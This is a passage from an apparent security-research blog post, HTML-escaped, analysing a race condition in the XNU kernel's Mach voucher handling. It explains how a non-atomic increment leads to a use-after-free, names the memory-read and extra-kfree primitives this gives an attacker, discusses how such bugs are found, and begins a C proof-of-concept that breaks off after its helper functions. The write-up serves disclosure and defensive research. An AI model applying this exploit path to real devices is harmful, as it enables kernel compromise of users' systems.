class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;And the reason the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;#39;t get freed by thread A is because in that window, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;will always be &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;larger&lt;/span&gt;&lt;span&gt;&amp;nbsp;than the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace-&amp;gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;value for any &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;which has a pointer to that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is larger because the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;increment always happens &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;before&lt;/span&gt;&lt;span&gt;&amp;nbsp;any &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;increment.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;This is why the absolute value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t important; all that matters is whether or not it&amp;#39;s equal to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;. And the only purpose of that is to determine whether there&amp;#39;s another thread in that window shown above.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;So how can we make something bad happen? Well, let&amp;#39;s assume that we successfully trigger the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;non-atomic increment and end up with a value of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is one less than &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;. What does this do to the race window detection logic? It completely flips it! If, in the steady-state &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one less than &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;then we race two threads; thread A which is dropping the last &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_ref&lt;/span&gt;&lt;span&gt;&amp;nbsp;and thread B which is attempting to revive it and thread B is in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c23&quot;&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above then &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;gets incremented before &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;, but since &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;started out one &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;lower&lt;/span&gt;&lt;span&gt;&amp;nbsp;than &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;(due to the successful earlier trigger of the non-atomic increment) then &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is now exactly &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;equal&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_made&lt;/span&gt;&lt;span&gt;; the exact condition which indicates we cannot possibly be in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c23&quot;&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;shown above, and it&amp;#39;s safe to free the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;which is in fact live on thread B&amp;#39;s stack!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Thread B then ends up with a revived &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a dangling &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;This gives an attacker two primitives that together would be more than sufficient to successfully exploit this bug: the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;mach_voucher_extract_attr_content&lt;/span&gt;&lt;span&gt;&amp;nbsp;voucher port MIG method would allow reading memory through the dangling &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer, and deallocating the voucher port would allow a controlled extra &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;of the dangling pointer.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;With the insight that you need to trigger these two race windows (the non-atomic increment to make &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;one too low, then the last-ref vs revive race) it&amp;#39;s trivial to write a PoC to demonstrate the issue; simply allocate and deallocate voucher ports on two threads, with at least one of them using a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;sub-recipe command. Pretty quickly you&amp;#39;ll hit the two race conditions correctly.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.fapbpabhxf26&quot;&gt;&lt;span&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;It&amp;#39;s interesting to think about how this vulnerability might have been found. Certainly somebody did find it, and trying to figure out how they might have done that can help us improve our vulnerability research techniques. I&amp;#39;ll offer four possibilities:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;1) Just read the code&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Possible, but this vulnerability is quite deep in the code. This would have been a marathon auditing effort to find and determine that it was exploitable. On the other hand this attack surface is reachable from every sandbox making vulnerabilities here very valuable and perhaps worth the investment.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;2) Static lock-analysis tooling&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;This is something which we&amp;#39;ve discussed within Project Zero over many afternoon coffee chats: could we build a tool to generate a fuzzy mapping between locks and objects which are probably meant to be protected by those locks, and then list any discrepancies where the lock isn&amp;#39;t held? In this particular case &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places; one time the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;is held and the other time it isn&amp;#39;t. Perhaps tooling isn&amp;#39;t even required and this could just be a technique used to help guide auditing towards possible race-condition vulnerabilities.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;3) Dynamic lock-analysis tooling&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Perhaps tools like &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c21&quot;&gt;&lt;a class=&quot;BGLtzooHlW-c251&quot; href=&quot;https://clang.llvm.org/docs/ThreadSanitizer.html&quot;&gt;ThreadSanitizer&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;could be used to dynamically record a mapping between locks and accessed objects/object fields. Such a tool could plausibly have flagged this race condition under normal system use. The false positive rate of such a tool might be unusably high however.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;4) Race-condition fuzzer&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;It&amp;#39;s not inconceivable that a coverage-guided fuzzer could have generated the proof-of-concept shown below, though it would specifically have to have been built to execute parallel testcases.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;As to what technique was actually used, we don&amp;#39;t know. As defenders we need to do a better job making sure that we invest even more effort in all of these possibilities and more.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.hmmckgsh9ct0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;PoC:&lt;/span&gt;&lt;/h2&gt;&lt;a id=&quot;t.236cca22f08a2d4239acb5bcd559819eddfeeef7&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.57&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;mach/mach.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;mach/mach_voucher.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;atm/atm_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;lt;voucher/ipc_pthread_priority_types.h&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;// @i41nbeer&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;mach_port_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;create_voucher_from_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;size_t recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_port_t voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; kern_return_t kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;host_create_mach_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_host_self&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(),&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_raw_recipe_array_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;quot;failed to create voucher from recipe\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
